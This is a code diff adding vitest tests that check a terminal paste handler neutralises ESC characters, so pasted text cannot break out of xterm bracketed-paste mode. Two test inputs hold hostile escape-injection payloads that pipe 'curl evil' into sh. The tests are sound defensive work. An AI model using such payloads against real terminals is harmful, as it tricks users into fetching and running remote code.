@@ -2,7 +2,7 @@ import { afterEach, beforeEach, expect, it, vi } from "vitest";
 import { Terminal } from "@xterm/xterm";
 import { commands } from "@/platform/ipc";
 import { usePlatform } from "@/platform/platformInfo";
-import { installTerminalPaste, pasteTerminalClipboard, type TerminalPasteTarget } from "./paste";
+import { installTerminalPaste, pasteIntoTerminal, pasteTerminalClipboard, type TerminalPasteTarget } from "./paste";
 
 const notify = vi.hoisted(() => vi.fn());
 vi.mock("@/workbench/contributions", () => ({ notifications: () => ({ notify }) }));
@@ -84,6 +84,83 @@ it("passes recovered multiline paths through xterm bracketed paste", async () =>
     expect(data).toEqual(["\x1b[200~/a b\r/中文\x1b[201~"]);
   } finally {
     term.dispose();
+  }
+});
+
+const BRACKETED_PASTE_ON = "\x1b[?2004h";
+
+async function openTerminal(bracketed: boolean) {
+  const host = document.createElement("div");
+  document.body.append(host);
+  const term = new Terminal({ allowProposedApi: true });
+  term.open(host);
+  const data: string[] = [];
+  term.onData((text) => data.push(text));
+  if (bracketed) await new Promise<void>((resolve) => term.write(BRACKETED_PASTE_ON, resolve));
+  return {
+    host,
+    term,
+    data,
+    close() {
+      term.dispose();
+      host.remove();
+    },
+  };
+}
+
+function pasteEvent(text: string): Event {
+  const event = new Event("paste", { bubbles: true, cancelable: true });
+  Object.defineProperty(event, "clipboardData", { value: { getData: () => text, files: [], types: ["text/plain"] } });
+  return event;
+}
+
+it("shows an ESC in pasted text as a symbol so it cannot end bracketed paste early", async () => {
+  const { term, data, close } = await openTerminal(true);
+  try {
+    pasteIntoTerminal(term, "a\x1b[201~curl evil|sh\r");
+    expect(data).toEqual(["\x1b[200~a\u241b[201~curl evil|sh\r\x1b[201~"]);
+  } finally {
+    close();
+  }
+});
+
+it("leaves pasted text unchanged when the shell has not asked for bracketed paste", async () => {
+  const { term, data, close } = await openTerminal(false);
+  try {
+    pasteIntoTerminal(term, "a\x1b[201~b\r");
+    expect(data).toEqual(["a\x1b[201~b\r"]);
+  } finally {
+    close();
+  }
+});
+
+it("claims a Ctrl+V whose text holds an ESC, before xterm's own listener brackets it as is", async () => {
+  const { host, term, data, close } = await openTerminal(true);
+  const remove = installTerminalPaste(host, (text) => pasteIntoTerminal(term, text));
+  try {
+    const event = pasteEvent("README\x1b[201~;curl evil|sh;#\r");
+    term.textarea!.dispatchEvent(event);
+    expect(event.defaultPrevented).toBe(true);
+    expect(data).toEqual(["\x1b[200~README\u241b[201~;curl evil|sh;#\r\x1b[201~"]);
+  } finally {
+    remove();
+    close();
+  }
+});
+
+it("leaves a Ctrl+V without an ESC to xterm", async () => {
+  const { host, term, data, close } = await openTerminal(true);
+  const paste = vi.fn((text: string) => pasteIntoTerminal(term, text));
+  const remove = installTerminalPaste(host, paste);
+  try {
+    const event = pasteEvent("ls -la\r");
+    term.textarea!.dispatchEvent(event);
+    expect(event.defaultPrevented).toBe(false);
+    expect(paste).not.toHaveBeenCalled();
+    expect(data).toEqual(["\x1b[200~ls -la\r\x1b[201~"]);
+  } finally {
+    remove();
+    close();
   }
 });
 
